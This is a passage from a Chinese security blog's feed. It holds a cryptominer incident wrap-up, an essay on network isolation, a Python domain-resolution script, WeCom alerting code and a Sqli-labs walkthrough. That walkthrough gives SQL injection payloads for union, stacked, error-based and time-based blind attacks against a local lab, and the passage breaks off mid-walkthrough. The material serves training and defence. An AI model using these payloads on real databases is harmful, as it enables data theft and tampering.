src="https://upload-images.jianshu.io/upload_images/6269327-c63d320e2b0401d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="本地执行脚本"><br>可以看到这里执行生成了三个sh简单加密的脚本文件：nmi，nbus和.dbus是哪个文件，这三个脚本文件解密之后是三个cat和perl的脚本，分别执行了一下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /xxx/xxx/xxx/xxx/Favicon.ico | perl</span><br><span class="line">$ cat /xxx/xxx/pkcs | perl</span><br><span class="line">$ cat /xxx/xxx/xxx/xxxxx/xxx/xxxxxx/mockup | perl</span><br></pre></td></tr></table></figure></p><p>执行了三个perl脚本，就是挖矿的脚本了。最后我们把生成的恶意文件备份之后就进行清除了，总共是三个sh脚本，三个perl挖矿脚本和两个记录id的随机数之类的文件。<br>怎么说呢，这次攻击分析看似挺简单的，但是最难的部分，从日志里找出攻击者的恶意访问是很困难的，需要有很多的经验，比如对最近新漏洞的了解，以及各类典型漏洞的攻击方式，才能及时的从庞大的日志文件中根据特征找到攻击者的痕迹。<br>安全从业者还是十分吃经验的，博主也会更多的在实战中历练自己，也会分享记录自己的经验。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一次挖矿病毒攻击分析&quot;&gt;&lt;a href=&quot;#一次挖矿病毒攻击分析&quot; c
      
    
    </summary>
    
      <category term="攻击分析" scheme="https://rliyuqing.github.io/categories/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
    
      <category term="攻击分析" scheme="https://rliyuqing.github.io/tags/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>内网隔离和纵深防御浅谈</title>
    <link href="https://rliyuqing.github.io/2019/04/15/25.%E5%86%85%E7%BD%91%E9%9A%94%E7%A6%BB%E5%92%8C%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E6%B5%85%E8%B0%88/"/>
    <id>https://rliyuqing.github.io/2019/04/15/25.内网隔离和纵深防御浅谈/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:21.398Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="内网隔离和纵深防御浅谈"><a href="#内网隔离和纵深防御浅谈" class="headerlink" title="内网隔离和纵深防御浅谈"></a>内网隔离和纵深防御浅谈</h1><hr><p>今天在给客户的公司做日常的测试的时候发现了一个内网的系统对外开放了，本来这是一件挺正常的事情，因为企业总会出现各种生产环境的一些或大或小的变动，可能某些时候就会出现某个不该对外开放的系统对外开放了，但是因为都有验证甚至二次验证，所以安全隐患不是很高。这次的这个客户企业的机器之前也出现过几次内网系统对外网公开了，但是都没有用什么大的威胁，外网的可操作性也很少，爆破账号密码都十分的困难。但是这次的对外开放的这个系统竟然出现了可以直接匿名用户登录并web端执行脚本的情况，虽然匿名用户没有执行sh脚本的额权限，但是有执行python脚本的权限，可以直接反弹shell，于是赶紧联系了老板，与客户公司取得联系及时修复漏洞。<br>是一个Zeppelin的线上系统的匿名用户登录的情况。为什么这次要特点说一说这次遇到的情况呢？因为这是我所期待，也是预料之中会出现的情况。<br>之前在客户的公司实习了一段时间。再去客户的公司事实习之前，自己也对他们有一些简单的测试，发现他们内外网隔离做的很好，改对外开放的对外开放，不该对外开放的一个都访问不了。但是在公司实习的时候，进入内网之后才发现内网的各种系统还是很乱的，许多系统为了方便都是没有验证机制的，甚至连企业的wiki文档系统都不需要验证员工身份，里面许多敏感文件。这就让我想起了之前老板和我们说过的，那些表面安全工作做得很好的内部可能漏洞百出，在实习的两个礼拜内，企业内部的src也是刷了很多。所以我觉得肯定会出现问题，只有某个系统因为谋些环境变动而对外网开放，就很容易被攻击者轻松日穿。<br>其实这也是企业发展的正常道路，客户公司也是最近才成立安全部门的，在资源有限的情况下优先做好内外网隔离是个正确的选择。但是只做内网隔离不做纵深防御是错误的。<br>做好内网隔离是企业安全的基础，在资源有限的情况下优先做内网隔离，但是纵深防御也是十分必要的。认为做好了隔离而忽略了内网的防御，就很容易出现一旦有机器在公网暴露就会被轻松攻破。风险分析的模型不止包括事件发生的概率，还有产生的危险程度。低概率但是带来严重影响的攻击也是会出现高风险值。资源有限的情况也需要考虑到资源的合理分配了，优先做隔离是资源最大化利用的有效手段。<br>优先做隔离没有错，只做隔离却没有做纵深防御是错的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;内网隔离和纵深防御浅谈&quot;&gt;&lt;a href=&quot;#内网隔离和纵深防御浅谈&quot;
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>python根据域名获取ip</title>
    <link href="https://rliyuqing.github.io/2019/04/15/26.python%E6%A0%B9%E6%8D%AE%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96ip/"/>
    <id>https://rliyuqing.github.io/2019/04/15/26.python根据域名获取ip/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:26.691Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="python根据域名获取ip"><a href="#python根据域名获取ip" class="headerlink" title="python根据域名获取ip"></a>python根据域名获取ip</h1><hr><p>过完年了，重新开始搬砖了。最近客户公司要进行全面的安全检测，于是给我们了一份很全的域名列表，然后让我们从外网进行简单的测试，但是这个域名实在是太多太多了，而且公司的域名很打一部分都是解析到内网的，外网根本无法访问，于是写了个简单的小脚本进行筛选，主要功能就是获取域名所对应的ip以及剔除解析到内网的域名。用队列和多线程的结构，速度能快很多，毕竟量上去了单线程还是很慢的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/02/25</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : get_public_ip.py</span></span><br><span class="line">import socket</span><br><span class="line">import csv</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue()</span><br><span class="line">threading_num = 50</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(<span class="string">"alldomain.txt"</span> , <span class="string">"r"</span>) as f:</span><br><span class="line">    filedata = f.readlines()</span><br><span class="line">    q.put(filedata)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    <span class="keyword">while</span> not q.empty():</span><br><span class="line">        filedata = q.get()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filedata:</span><br><span class="line">            url = str(i).replace(<span class="string">"\n"</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#print(url)</span></span><br><span class="line">            try:</span><br><span class="line">                myaddr = socket.getaddrinfo(url, <span class="string">'http'</span>)</span><br><span class="line">                <span class="comment">#print(str(myaddr[0][4][0])[:3])</span></span><br><span class="line">                <span class="keyword">if</span> str(myaddr[0][4][0])[:3] != str(172):</span><br><span class="line">                    <span class="comment">#print(url+" "+str(myaddr[0][4][0]))</span></span><br><span class="line">                    <span class="comment">#value_array.append(url).append(str(myaddr[0][4][0]))</span></span><br><span class="line">                    with open(<span class="string">"public_domain.csv"</span>,<span class="string">"a"</span>) as fw:</span><br><span class="line">                        writer = csv.writer(fw)</span><br><span class="line">                        writer.writerow([url,str(myaddr[0][4][0])])</span><br><span class="line">            except:</span><br><span class="line">                <span class="comment">#print('can't open')</span></span><br><span class="line">                pass</span><br><span class="line">        <span class="comment">#f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'begin'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threading_num):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'over'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;python根据域名获取ip&quot;&gt;&lt;a href=&quot;#python根据域
      
    
    </summary>
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>企业微信告警和回调</title>
    <link href="https://rliyuqing.github.io/2019/04/15/27.%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E5%91%8A%E8%AD%A6%E4%BB%A5%E5%8F%8A%E5%9B%9E%E8%B0%83/"/>
    <id>https://rliyuqing.github.io/2019/04/15/27.企业微信告警以及回调/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:52:32.275Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="企业微信告警和回调"><a href="#企业微信告警和回调" class="headerlink" title="企业微信告警和回调"></a>企业微信告警和回调</h1><hr><p>最近正在参与一次护网行动，学到很多东西，等这次结束再来好好谈谈收获和总结吧，这都是后话了。这次主要分享一下企业微信的告警以及回调的实现以及踩的坑。<br>先说说前因后果吧，在护网行动正式开打之前，我们对xx公司也进行详细的网络情况了解，以及合作梳理。具体之后再说，反正结论就是网络边界的梳理和整顿都已经弄得比较不错了，唯一存在问题的就是在一些waf以及ids的告警上，因为策略全部default开启，导致出现大量的告警情况，为对攻击的分析以及响应带来很多麻烦，因此我们一部分工作在整理和梳理网络告警的方面。<br>他们一共有三个网络告警的设备，防火墙，ids，F5等，都是通过同一个zabbix发送请求到告警平台进行告警。于是我们在阿里云上建立了一个soc(安全运营中心)，上面搭了elk，zabbix将三个网络告警全部发送到这个elk上……..之后再说。最后将soc上整理之后的告警发送到企业微信，并达到通过在企业微信上回复消息，对ip进行增删黑名单的操作。<br>企业微信回调过程：</p><ol><li>创建企业微信应用：登录企业微信-&gt;应用与小程序-&gt;自建-&gt;创建应用</li><li>创建了之后<br><img src="https://upload-images.jianshu.io/upload_images/6269327-da186556fe2ffd5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"><br>设置api接收进行。设置api接收时需要进行回调验证，部署好后面那个回调代码就行。<br>发送告警很简单。根据企业微信给的api文档说明以及示例代码可以写出来。我这里用的是python3：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/6/2</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : sent_wexin.py</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/getmsg'</span>,methods=[<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    corpid = <span class="string">"xxxxxxxxxxx"</span></span><br><span class="line">    secret = <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line">    agentid = <span class="string">"xxxxxxxxx"</span></span><br><span class="line">    <span class="comment">#if request.method == 'GET':</span></span><br><span class="line">     <span class="comment">#   return 'Deny'</span></span><br><span class="line">     <span class="comment">#接收POST的数据</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form.get(<span class="string">'checkid'</span>) == <span class="string">'checkid'</span>:  <span class="comment"># 校验的id，避免有人恶意发送</span></span><br><span class="line">            GetMsg = request.form.get(<span class="string">'msg'</span>)</span><br><span class="line">            <span class="built_in">print</span>(GetMsg)</span><br><span class="line">            wechat = WeChat(corpid, secret, agentid)</span><br><span class="line">            <span class="keyword">if</span> wechat.send_message(GetMsg) == 1:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Sent to weixin successed'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'Failed'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'Deny'</span></span><br><span class="line"></span><br><span class="line">class WeChat(object):</span><br><span class="line">    def __init__(self, corpid, secret, agentid):</span><br><span class="line">        self.url = <span class="string">"https://qyapi.weixin.qq.com"</span></span><br><span class="line">        self.corpid = corpid</span><br><span class="line">        self.secret = secret</span><br><span class="line">        self.agentid = agentid</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取企业微信的 access_token</span></span><br><span class="line">    def access_token(self):</span><br><span class="line">        url_arg = <span class="string">'/cgi-bin/gettoken?corpid=&#123;id&#125;&amp;corpsecret=&#123;crt&#125;'</span>.format(</span><br><span class="line">            id=self.corpid, crt=self.secret)</span><br><span class="line">        url = self.url + url_arg</span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        text = response.text</span><br><span class="line">        self.token = json.loads(text)[<span class="string">'access_token'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建消息格式</span></span><br><span class="line">    def messages(self, msg):</span><br><span class="line">        values = &#123;</span><br><span class="line">            <span class="string">"touser"</span>: <span class="string">'@all'</span>,</span><br><span class="line">            <span class="comment"># "toparty" : "PartyID1|PartyID2",   # 向这些部门发送  #'@all'给所有的发</span></span><br><span class="line">            <span class="string">"msgtype"</span>: <span class="string">'text'</span>,</span><br><span class="line">            <span class="string">"agentid"</span>: self.agentid,</span><br><span class="line">            <span class="string">"text"</span>: &#123;<span class="string">'content'</span>: msg&#125;,</span><br><span class="line">            <span class="string">"safe"</span>: 0</span><br><span class="line">        &#125;</span><br><span class="line">        self.msg = (bytes(json.dumps(values), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送信息</span></span><br><span class="line">    def send_message(self, msg):</span><br><span class="line">        self.access_token()</span><br><span class="line">        self.messages(msg)</span><br><span class="line">        send_url = <span class="string">'&#123;url&#125;/cgi-bin/message/send?access_token=&#123;token&#125;'</span>.format(url=self.url, token=self.token)</span><br><span class="line">        response = requests.post(url=send_url, data=self.msg)</span><br><span class="line">        errcode = json.loads(response.text)[<span class="string">'errcode'</span>]</span><br><span class="line">        <span class="keyword">if</span> errcode == 0:</span><br><span class="line">            <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> 0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=8000,debug=True)</span><br></pre></td></tr></table></figure></li></ol><p>下面是用户将数据发送给企业微信上的应用，回调发送到soc上进行记录，这里是记录在文件中：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line">from flask import Flask,request</span><br><span class="line">from WXBizMsgCrypt import WXBizMsgCrypt</span><br><span class="line">import xml.etree.cElementTree as ET</span><br><span class="line">import sys</span><br><span class="line">from RedisUtil import RedisUtil</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/weixin'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    sToken = <span class="string">'xxxxxxxx'</span></span><br><span class="line">    sEncodingAESKey = <span class="string">'xxxxxxxxxxxxxxxxx'</span></span><br><span class="line">    sCorpID = <span class="string">'xxxxxxxxxxxx'</span></span><br><span class="line">    wxcpt=WXBizMsgCrypt(sToken,sEncodingAESKey,sCorpID)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取url验证时微信发送的相关参数</span></span><br><span class="line">    sVerifyMsgSig=request.args.get(<span class="string">'msg_signature'</span>)</span><br><span class="line">    sVerifyTimeStamp=request.args.get(<span class="string">'timestamp'</span>)</span><br><span class="line">    sVerifyNonce=request.args.get(<span class="string">'nonce'</span>)</span><br><span class="line">    sVerifyEchoStr=request.args.get(<span class="string">'echostr'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sReqMsgSig = sVerifyMsgSig</span><br><span class="line">    sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sReqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    sResqMsgSig = sVerifyMsgSig</span><br><span class="line">    sResqTimeStamp = sVerifyTimeStamp</span><br><span class="line">    sResqNonce = sVerifyNonce</span><br><span class="line">    <span class="comment">#验证url</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        ret,sEchoStr=wxcpt.VerifyURL(sVerifyMsgSig, sVerifyTimeStamp,sVerifyNonce,sVerifyEchoStr)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0 ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>,ret)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        <span class="built_in">return</span> sEchoStr</span><br><span class="line"></span><br><span class="line">    <span class="comment">#接收客户端消息</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        sReqMsgSig = sVerifyMsgSig</span><br><span class="line">        sReqTimeStamp = sVerifyTimeStamp</span><br><span class="line">        sReqNonce = sVerifyNonce</span><br><span class="line">        sReqData = request.data</span><br><span class="line"></span><br><span class="line">        ret,sMsg=wxcpt.DecryptMsg( sReqData, sReqMsgSig, sReqTimeStamp, sReqNonce)</span><br><span class="line">        <span class="keyword">if</span> (ret != 0):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"ERR: VerifyURL ret:"</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#解析发送的内容</span></span><br><span class="line">        xml_tree = ET.fromstring(sMsg)</span><br><span class="line">        content = xml_tree.find(<span class="string">"Content"</span>).text</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="comment">#将接收到的内容记录在文件当中</span></span><br><span class="line">        f1 = open(<span class="string">'weixin_soc_get.txt'</span>, <span class="string">'a'</span>)</span><br><span class="line">        f1.writelines(content+<span class="string">"\n"</span>)</span><br><span class="line">        f1.close()</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"OK"</span> <span class="comment"># 默认发送三次 ，接收到ok之后就不会重复发送</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=9999,debug=True)</span><br></pre></td></tr></table></figure></p><p>直接更改代码中的token和企业id什么的就能直接用，具体的可以参考官方文档<a href="https://work.weixin.qq.com/api/doc" target="_blank" rel="noopener">https://work.weixin.qq.com/api/doc</a><br>以及官方github库<a href="https://github.com/sbzhu/weworkapi_python" target="_blank" rel="noopener">https://github.com/sbzhu/weworkapi_python</a><br>带上官方这里给的是python2的，而且给的代码库还会有一些问题，主要就是WXBizMsgCrypt.py这个文件，具体的我已经进行更改，在我的github项目中，可以直接替换就行：<a href="https://github.com/rliyuqing/weworkapi_py3" target="_blank" rel="noopener">https://github.com/rliyuqing/weworkapi_py3</a><br>回调和发送信息创建的webserver用nginx代理就行，十分方便:<br><img src="https://upload-images.jianshu.io/upload_images/6269327-86b09a2184875ac7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nginx代理"><br>统一端口开放很重要的。其他的内容下次在分享，主要刚刚把企业微信告警的来回的两条线走通，所以记录分享一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;企业微信告警和回调&quot;&gt;&lt;a href=&quot;#企业微信告警和回调&quot; cla
      
    
    </summary>
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-lab实验Task3（less39-53）</title>
    <link href="https://rliyuqing.github.io/2019/04/15/8.%20Sqli-lab%E5%AE%9E%E9%AA%8CTask3%EF%BC%88less39-53%EF%BC%89/"/>
    <id>https://rliyuqing.github.io/2019/04/15/8. Sqli-lab实验Task3（less39-53）/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:50:11.099Z</updated>
    
    <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h1 id="Sqli-labs实验Task3（less39-53）"><a href="#Sqli-labs实验Task3（less39-53）" class="headerlink" title="Sqli-labs实验Task3（less39-53）"></a>Sqli-labs实验Task3（less39-53）</h1><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这个没有闭合的，所以直接使用联合查询：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-39/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>不同的闭合，多尝试几次。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-40/?id=0<span class="string">') union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>和39一样：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>但是page-3里的肯定不会这么简单，看了看page-3的标题，这是叠加注入，那就得在搞点其他的测试了，就用less-41来试一试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;create table <span class="built_in">test</span> like users;-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>创建一个和users结构一样的表test。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6d269fb93c781bd8.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.PNG"><br>同理我们可以对表数据进行更新，比如更改用户密码，删除数据库，或者利用load_file函数上传文件，比如php文件。。。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;select load_file(<span class="string">'c:/tmpupbbn.php'</span>);</span><br></pre></td></tr></table></figure></p><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>这里显示的是登陆框，结合这里的叠加注入，我们继续尝试新姿势。<br>登录框用户名随便填，密码填：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a<span class="string">';create table test2 like users; --</span></span><br></pre></td></tr></table></figure></p><p>创建一个test2的表。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-af32e5f42bee7f97.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.PNG"><br>同理，我们可以删除这个表，和之前的操作一样，我们用户名随便填，叠加注入写入相应的语句就行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a<span class="string">';drop table test2 ; --</span></span><br></pre></td></tr></table></figure></p><p>其他的可以继续尝试。不同的数据库会有不同的语句，有兴趣的可以多学习。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>这个和上一个差不多，不过post传参的闭合方式为单引号加括号，相应的语句稍微改一改就行。</p><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>这里和42其实相差不多，只不多这里没有了报错，但是注入语句还是一样的，我们写几个新语句大家看看。<br>插入数据：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ a’; insert into users(id,username,password) values (<span class="string">'233'</span>,<span class="string">'233'</span>,<span class="string">'233'</span>); --</span><br></pre></td></tr></table></figure></p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>这个也一样，和43的闭合时一样的，单引号加括号，只不过这里是没有报错，会提示说你是一个傻hacker。。。但是我们自己可以去查看数据库发现自己的语句是被执行了的。</p><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>我们可以看到46的标题变了，现在我们要进行的就是order by的注入测试了，具体什么意思的。就是我们之前的sql语句最后都是limit 0,1。现在是：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ select * from users order by id;</span><br></pre></td></tr></table></figure></p><p>这时候我们就不能用之前的进行访问了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1</span><br></pre></td></tr></table></figure></p><p>这个传参就是sort传的就是order by的值，sort=1表示按id排序，看一下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-036d06241df614ce.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.PNG"><br>这就是我们访问上面的url看到的页面，这时候我们就可以考虑考虑如何构造order by的注入语句。Order by后面可以接上面语句呢。<br>我们可以尝试使用mysql的updatexml的函数来达到注入获取敏感信息的目的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fd5d4a22971257c2.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.PNG"><br>同样我们可以更改updatexml()函数里的第二个参数里的sql语句，来获取我们想要的信息。比如：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-46/?sort=5 and(updatexml(1,concat(0x7e,(select email_id from emails <span class="built_in">limit</span> 0,1)),0))</span><br></pre></td></tr></table></figure></p><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>这个一下就猜到加了闭合。。。不要问我为什么，套路熟悉了一下就破了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-47/?sort=1<span class="string">' and(updatexml(1,concat(0x7e,(select email_id from emails limit 0,1)),0)) -- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这个没有报错了，这时候我们就不能用XPATH报错来获取信息了。不过可以使用盲注。<br>可以利用sort=rand(true/false)进行判断。写一下我们的注入语句：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-48/?sort=rand(ascii(left(database(),1))=115)</span><br></pre></td></tr></table></figure></p><p>这是正确的情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-feae911e0856f8ac.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.PNG"><br>这是错误的情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-1bc40b2bafe10e3f.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.PNG"><br>我们可以根据正确错误的不同返回值来获取信息。<br>更多关于updatexml的注入可查看：<br><a href="http://www.freebuf.com/column/145988.html" target="_blank" rel="noopener">www.freebuf.com/column/145988.html</a></p><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>这一个无论我们输入什么得出的都是一样的，这个时候我们就不能用上面的方法了，不过可以用基于时间的盲注（单引号闭合）：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-49/?sort=1<span class="string">' and (If(ascii(substr((select username from users where id=1),1,1))=69,0,sleep(5)))-- #</span></span><br></pre></td></tr></table></figure></p><h2 id="Less-50"><a href="#Less-50" class="headerlink" 